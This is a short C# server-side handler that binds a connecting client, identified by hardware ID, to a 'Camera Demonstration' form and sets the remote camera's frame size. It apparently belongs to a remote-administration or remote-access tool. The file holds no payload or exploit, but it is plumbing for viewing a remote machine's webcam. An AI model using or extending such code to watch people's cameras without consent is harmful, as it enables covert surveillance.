using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerCameraDemonstration
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
		}
		else
		{
			if (!((string)objects[1] == "Connect"))
			{
				return;
			}
			FormCameraDemonstration form1 = (FormCameraDemonstration)Application.OpenForms["Camera Demonstration:" + (string)objects[2]];
			if (form1 == null)
			{
				client.Disconnect();
				return;
			}
			form1.Invoke((MethodInvoker)delegate
			{
				form1.client = client;
				form1.cameraSize = new Size((int)objects[3], (int)objects[4]);
				form1.Text = "Camera Demonstration [" + (string)objects[2] + "]";
				form1.materialSwitch1.Enabled = true;
			});
			client.Tag = form1;
			client.Hwid = (string)objects[2];
		}
	}
}
